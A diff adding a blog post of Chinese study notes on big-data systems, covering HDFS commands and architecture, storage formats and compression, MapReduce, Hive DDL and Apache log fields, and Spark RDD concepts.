+<li><p>HDFS 客户端<br>  <code>hdfs dfs  -ls -R -h path/to/target</code>   # 同ls命令，此处列出的大小是单个replica的，并没有翻倍<br>  <code>hdfs dfs du -h path /to/target</code> # 列出总大小，算上了重复的replica<br>   ·hdfs dfs df -h ` # 查看系统储存空间使用情况</p>
+<pre><code>hdfs dfs mkdir -p dir/to/make
+hdfs dfs rm -r 
+hdfs dfs touchz
+hdfs dfs get/put/getmerge/copy
+</code></pre><p>   hdfs dfs setrep  #设置replica factor<br>   hdfs fsck   /path/to/target   -files -blocks locations #(file system check)<br>   hdfs fsck -blockid xxx<br>   hffs dfs find </p>
+</li>
+</ul>
+<h2 id="WEBUI和RESTAPI"><a href="#WEBUI和RESTAPI" class="headerlink" title="WEBUI和RESTAPI"></a>WEBUI和RESTAPI</h2><ul>
+<li>NameNode50070端口</li>
+<li>在WEBUI上可以看到<pre><code>- 权限
+- blockID
+- gsstamp
+- bloopoolID   #其实就是启动了联邦模式的多名称空间的id
+</code></pre></li>
+<li>联邦模式<br>1、由于单组Namenode在大规模集群中存在较大的局限性，Hadoop开源社区提供了Federation的方案，由多组Namenode在一个集群中共同提供服务，每个Namenode拥有一部分Namespace，工作互相独立，互不影响。</li>
+</ul>
+<p>2、在Federation中，Datanode被用作通用的数据块存储设备，每个DataNode要向集群中所有的Namenode注册，且周期性的向所有Namenode发送心跳和块报告，并执行来自所有Namenode的命令。</p>
+<p>##NameNode的结构</p>
+<ul>
+<li>假设有10PB的数据要存<pre><code>- 每个硬盘是2T，每天有15个硬盘会挂掉
+- namenode储存的对象需要150B，并且储存在内存中
+- 那么需要的硬盘是 ： 10PB/2TB *3
+- 需要的内存：  10PB/128MB *150b  ≈  3.9GB
+</code></pre></li>
+<li>NamdeNode使用WAL（write ahead log）机制保障namenode的数据不丢失<pre><code>- edit log 被复制到不同的硬盘上，保障metainfo不丢失
+- fsimage保存内存状态的快照
+- 这个机制恢复namenode需要太多的时间，于是发明了Secondary NameNode，sencondary namenode会从namenode获取fsimage和editlog
+</code></pre></li>
+</ul>
+<p>小结：<br>-总结并解释NameNode的结构（editlog和fsimage;RAM）</p>
+<ul>
+<li>估计hdfs集群需要多少资源</li>
+<li>小文件问题是什么，它的瓶颈是什么？</li>
+</ul>
+<h2 id="HDFS的文件存储"><a href="#HDFS的文件存储" class="headerlink" title="HDFS的文件存储"></a>HDFS的文件存储</h2><p>不同格式的存储在以下方面有差异：</p>
+<ul>
+<li>空间效率 space efficiency</li>
+<li>编码解码速度  encoding &amp; decoding speed</li>
+<li>支持的数据类型 supported data types<br>› splittable/monolithic structure</li>
+<li>扩展性 extensibility # 有的格式不支持加列</li>
+</ul>
+<h3 id="文本类型"><a href="#文本类型" class="headerlink" title="文本类型"></a>文本类型</h3><ul>
+<li>常见，人可读，易于生成，易于解析</li>
+<li>占据的存储空间大</li>
+<li>CSV, TSV, JSON, XML 都是常见的文本类型</li>
+<li>扩展性不好</li>
+</ul>
+<h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><h3 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h3><h4 id="SequenceFile"><a href="#SequenceFile" class="headerlink" title="SequenceFile"></a>SequenceFile</h4><h5 id="行存格式"><a href="#行存格式" class="headerlink" title="行存格式"></a>行存格式</h5><ul>
+<li>HDFS上的第一个二进制格式</li>
+<li>储存着key-value的序列</li>
+<li>Java实现的序列化反序列化</li>
+<li>包含header，metadata，等</li>
+<li>有3种格式<pre><code>- 经过block压缩的格式有两种：经过record压缩和未经过record压缩
+- 未经过block压缩
+</code></pre></li>
+<li>特点<pre><code>- 空间效率适中
+- 速度快
+- 数据类型：Java编程中的数据类型
+- 能否拆分：可以
+- 扩展性：不可扩展
+</code></pre><h4 id="Avro"><a href="#Avro" class="headerlink" title="Avro"></a>Avro</h4></li>
+<li>是格式，也是库</li>
+<li>用定义好的schema储存对象<pre><code>- 制定field name，types，alias
+- 制定序列化/反序列化的代码
+- 可以更新schema
+</code></pre></li>
+<li><p>支持多语言</p>
+</li>
+<li><p>组成：包含header，bloak等，区别的SequenceFile的点在于它的schema是通过schema定义的，而SeqenceFile是用户代码</p>
+</li>
+<li>特性：<pre><code>- 空间效率适中到好
+- 速度快
+- 数据类型：类json
+- 能否拆分：可以
+- 扩展性：可扩展
+</code></pre></li>
+</ul>
+<h5 id="列存格式"><a href="#列存格式" class="headerlink" title="列存格式"></a>列存格式</h5><ul>
+<li><p>RCfile</p>
+<pre><code>- HDFS的第一个列存格式
+- 水平/垂直分区
+      - 把row分成row group
+- 三部分组成：16 Byte Sync，meatadata,column data 
+
+- 空间效率高
+- 速度中等到快，有更少的IO
+- 数据类型：byteString,与Hive结合使用，Hive进行序列化反序列化，所以格式本身不序列化
+- 能否拆分：可以
+- 扩展性：不可扩展
+</code></pre></li>
+<li>Parquet<pre><code>- 存在很有列优化
+</code></pre></li>
+</ul>
+<p>小结：</p>
+<ul>
+<li>SequenceFile适用于Java开发</li>
+<li>Avro可以在很多场合适用</li>
+<li>Rcfiles/ORC/Parquet适用于宽表，数据仓库</li>
+</ul>
+<h4 id="Compression"><a href="#Compression" class="headerlink" title="Compression"></a>Compression</h4><ul>
+<li>block级别的压缩<pre><code>- Rcfile，parquet，Sequencefile
+</code></pre></li>
+<li>文件级别的压缩<pre><code>- 能在文件内导航
+</code></pre></li>
+</ul>
+<p>各种类型的文件压缩的数据：</p>
+<ul>
+<li>Gzip<pre><code>- compression speed ~16-90 MiB/s
+- decompression speed ~250- 320 MiB/s
+- ratio ~2.77 .. 3.43
+</code></pre></li>
+<li>Bzip2<pre><code>- compression speed ~12-14MB/s
+- decompression speed ~38-42MiB/s
+- ratio ~4.02 .. 4.80
+</code></pre></li>
+<li>LZO<pre><code>- compression speed ~77-150 MiB/s
+- decompression speed ~290-314 MiB/s
+- ratio ~2.10 .. 2.48
+</code></pre></li>
+<li><p>Snappy</p>
+<pre><code>- compression speed ~200 MiB/s
+- decompression speed ~475 MiB/s
+- ratio ~2.05
+</code></pre></li>
+<li><p>Bzip2最慢，也最省空间；Snappy最快，不省空间</p>
+</li>
+</ul>
+<h5 id="什么时候使用压缩？"><a href="#什么时候使用压缩？" class="headerlink" title="什么时候使用压缩？"></a>什么时候使用压缩？</h5><ul>
+<li>压缩是需要CPU进行计算的，如果HDFS能处理100MB/s，CPU只能处理100MB/s，说明瓶颈在CPU；如果CPU能处理1000MB/s，那么瓶颈就在IO；此时选择压缩率为5的话，100MB/s * 5 = 500MB/s也未能完全利用CPU的计算能力</li>
+</ul>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
+<li>文件格式有哪些</li>
+<li>各有什么优缺点</li>
+<li>什么时候使用压缩？<br>Leslie Lamport 分布式系统图灵奖获得者</li>
+</ul>
+<p>时钟同步：<br>绝对同步<br>相对同步</p>
+<p>同步系统/异步系统<br>两类：<br>fail stop  perfect link synchronous</p>
+<p>fail recovery fair loss link asynchronous</p>
+<p>大数据系统属于第二类</p>
+<p>MapReduce</p>
+<p>Map：<br>对每一个元素执行相同操作<br>Reduce<br>对所有元素依次执行操作<br>Shuffle</p>
+<p>例子：<br>分布式的linux命令：<br>grep：map使用grep，没有reduce<br>head：都没有<br>wc：map使用wc，reduce使用sum</p>
+<h3 id="容错机制"><a href="#容错机制" class="headerlink" title="容错机制"></a>容错机制</h3><ul>
+<li>Mapper和Reducer挂了会发生什么？<br>Master会自动把任务分配到好的节点去。</li>
+<li>Hadoop v1和Tracker和Tracer是什么？Yarn中的ResourceManager和NodeManager呢？<pre><code>- 首先用户程序 (JobClient) 提交了一个 job，job 的信息会发送到 Job Tracker 中，Job Tracker 是 Map-reduce 框架的中心，他需要与集群中的机器定时通信 (heartbeat), 需要管理哪些程序应该跑在哪些机器上，需要管理所有 job 失败、重启等操作。
+- TaskTracker 是 Map-reduce 集群中每台机器都有的一个部分，他做的事情主要是监视自己所在机器的资源情况。
+- TaskTracker 同时监视当前机器的 tasks 运行状况。TaskTracker 需要把这些信息通过 heartbeat 发送给 JobTracker，JobTracker 会搜集这些信息以给新提交的 job 分配运行在哪些机器上.
+</code></pre></li>
+</ul>
+<hr>
+<p>NodeManager管理资源，包括磁盘，CPU等，提供容器<br>ResourceManger申请资源</p>
+<h3 id="MapReduce和分布式Shell"><a href="#MapReduce和分布式Shell" class="headerlink" title="MapReduce和分布式Shell"></a>MapReduce和分布式Shell</h3><p>Leslie Lamport 分布式系统图灵奖获得者</p>
+<p>MapReduce</p>
+<p>Map：<br>对每一个元素执行相同操作<br>Reduce<br>对所有元素依次执行操作<br>Shuffle</p>
+<p>例子：<br>分布式的linux命令：<br>grep：map使用grep，没有reduce<br>head：都没有<br>wc：map使用wc，reduce使用sum</p>
+<h3 id="Streaming"><a href="#Streaming" class="headerlink" title="Streaming"></a>Streaming</h3><p>HDFS支持自定义steaming的函数，例子：<br><img src="https://img2020.cnblogs.com/blog/1366679/202010/1366679-20201009074811688-163070961.png" alt=""></p>
+<p>Combiner：在map阶段提前进行一次聚合，减少IO<br>Patitioner：<br>决定哪些数据被分到哪些reducer，默认是hash，可以继承petitioner自己实现<br>Comparator：<br>自定义比较的函数<br>优化MR任务：speculative execution/back up tasks<br>通过compression优化</p>
+<p>##Hive</p>
+<ul>
+<li>Apache HTTP 服务器的日志都有哪些字段？<br>127.0.0.1 - - [01/Aug/1995:00:00:01 -0400] “GET /images/launch-logo.gif HTTP/1.0” 200 1839</li>
+</ul>
+<p>一个详细一些的字段说明如下：</p>
+<p>127.0.0.1<br>第一项 ，发起请求的客户端IP地址。</p>
+<p>-<br>第二项 ，空白，用占位符“-”替代，表示所请求的信息（来自远程机器的用户身份），不可用。</p>
+<p>-<br>第三项，空白，表示所请求的信息（来自本地登录的用户身份），不可用。</p>
+<p>[01/Aug/1995:00:00:01 -0400]<br>第四项，服务器端处理完请求的时间，具体细节如下:<br>[day/month/year:hour:minute:second timezone]</p>
+<p>day = 2 digits<br>month = 3 letters<br>year = 4 digits<br>hour = 2 digits<br>minute = 2 digits<br>second = 2 digits<br>zone = (+ | -) 4 digits<br>“GET /images/launch-logo.gif HTTP/1.0”<br>第五项，客户端请求字符串的第一行，包含3个部分。1）请求方式 (e.g., GET, POST,HEAD 等.), 2）资源，3）客户端协议版本，通常是HTTP，后面再加上版本号</p>
+<p>200<br>第六项，服务器发回给客户端的状态码，这个信息非常有用，它告诉我们这个请求成功得到response(以2开头的状态码)，重定向(以3开头的状态码)，客户端引起的错误(以4开头的状态码)，服务器引起的错误(以5开头的状态码)。更多的信息可以查看([RFC 2616]）.</p>
+<p>1839<br>第七项，这个数据表明了服务器返回的数据大小（不包括response headers），当然，如果没有返回任何内容，这个值会是”-” (也有时候会是0).</p>
+<ul>
+<li>使用HiveQL解决业务问题</li>
+</ul>
+<h3 id="DDL和DML"><a href="#DDL和DML" class="headerlink" title="DDL和DML"></a>DDL和DML</h3><p>DDL和大多数数据库相同，不同之处在于：<br>1.外部表和内部表<br>内部表和外部表的区别：<br>         1）概念本质上<br>         内部表数据自己的管理的在进行表删除时数据和元数据一并删除。<br>         外部表只是对HDFS的一个目录的数据进行关联，外部表在进行删除时只删除元数据， 原始数据是不会被删除的。<br>         2）应用场景上<br>         外部表一般用于存储原始数据、公共数据，内部表一般用于存储某一个模块的中间结果数据。<br>         3）存储目录上<br>         外部表：一般在进行建表时候需要手动指定表的数据目录为共享资源目录，用lication关键字指定。<br>         内部表：无严格的要求，一般使用的默认目录。<br>2.数据类型<br>Hive可以保存复合类型的数据，包括Array，Map，Structure等复合类型：<br>    CREATE EXTERNAL TABLE tab_dataset (<br>        first_column STRING,<br>        second_column STRING,<br>        value INT<br>    )<br>    ROW FORMAT DELIMITED<br>    FIELDS TERMINATED BY ‘\001’<br>    COLLECTION ITEMS TERMINATED BY ‘\002’<br>    MAP KEYS TERMINATED BY ‘\003’<br>    LINES TERMINATED BY ‘\n’<br>    STORED AS file_format<br>    LOCATION ‘/user/adral/course2/week1/tab_dataset/‘;</p>
+<pre><code>// file_format 的类型   见本文
+</code></pre><p><img src="https://img2020.cnblogs.com/blog/1366679/202101/1366679-20210129104002229-1364012538.png" alt=""></p>
+<ul>
+<li>如何配置Hive的元数据？<br>• - Hive Service的APi有哪些？<br>   （来自文档）<ul>
+<li>API categories<pre><code>- Operation based APIs
+- Query based APIs
+</code></pre></li>
+<li>Available APIs<ul>
+<li>HCatClient (Java)</li>
+<li>HCatalog Storage Handlers (Java)</li>
+<li>HCatalog CLI (Command Line)</li>
+<li>Metastore (Java)</li>
+<li>WebHCat (REST)</li>
+<li>Streaming Data Ingest (Java)</li>
+<li>Streaming Mutation (Java)</li>
+<li>hive-jdbc (JDBC)-<br>-使用”explain”获取Hive表相关的信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Hive是如何序列化反序列化的？<br>序列化是对象转换为字节序列的过程。 反序列化是字节序列恢复为对象的过程。 对象的序列化主要有两种用途：对象的持久化，即把对象转换成字节序列后保存到文件中；对象数据的网络传送。 除了上面两点， hive的序列化的作用还包括：Hive的反序列化是对key/value反序列化成hive table的每个列的值。Hive可以方便的将数据加载到表中而不需要对数据进行转换，这样在处理海量数据时可以节省大量的时间。</li>
+</ul>
+<h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><h3 id="RDD"><a href="#RDD" class="headerlink" title="RDD"></a>RDD</h3><ul>
+<li>Resilient — able to withstand failures<pre><code>- Distributed — spanning across multiple machines
+- Formally, a read-only, partitioned collection of records
+</code></pre>To adhere to RDD interface, a dataset must implement:<pre><code>- partitions()  Array[Partition]   # 一般hdfs的一个block就刚好对应一个partition
+- iterator(p: Partition, parents: Array[Iterator])  Iterator
+- dependencies()  Array[Dependency]
+</code></pre></li>
+</ul>
+<p>transaction是lazy的，直到数据被请求才会实际进行处理<br>常用的transformation：<br>groupByKey</p>
+<p>reduceByKey<br>cogroup<br>join<br>leftOuterJoin<br>rightOuterJoin<br>fullOuterJoin</p>
+<p>宽依赖<br>窄依赖</p>
+<h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>Actions-&gt;Jobs-&gt; stages-&gt; tasks</p>
+<p>Spark执行的SparkContext管理着actions jobs stages tasks关系<br><img src="https://img2020.cnblogs.com/blog/1366679/202010/1366679-20201019074457782-1250468697.png" alt=""></p>
+<ul>
+<li>Job stage is a pipelined computation spanning between materialization<pre><code>- boundaries
+      - Task is a job stage bound to particular partitions
+      - Materialization happens when reading, shuffling or passing data to an action
+- narrow dependencies allow pipelining
+- wide dependencies forbid it
+</code></pre></li>
+</ul>
+<h3 id="SparkContext的其他作用"><a href="#SparkContext的其他作用" class="headerlink" title="SparkContext的其他作用"></a>SparkContext的其他作用</h3><ul>
+<li>Tracks liveness of the executors<pre><code>- required to provide fault-tolerance
+</code></pre></li>
+<li>Schedules multiple concurrent jobs to control the resource allocation within the application</li>
+<li>Performs dynamic resource allocation to control the resource allocation between different applications</li>
+</ul>
+<h3 id="持久化的最佳实践"><a href="#持久化的最佳实践" class="headerlink" title="持久化的最佳实践"></a>持久化的最佳实践</h3><ul>
+<li>For interactive sessions<pre><code>- cache preprocessed data
+</code></pre></li>
+<li>For batch computations<pre><code>- cache dictionaries
+- cache other datasets that are accessed multiple times
+</code></pre></li>
+<li>For iterative computations<pre><code>- cache static data
+</code></pre></li>
+<li>And do benchmarks!</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">大数据</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/10/大数据笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CDH，HDP，Apache Hadoop之间的关系" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -422,11 +1549,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">杂记</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+                <a href="javascript:void(0)" class="js-tag color3">网络</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">操作系统</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">安全</a>
               </li>
             
             <div class="clearfix"></div>
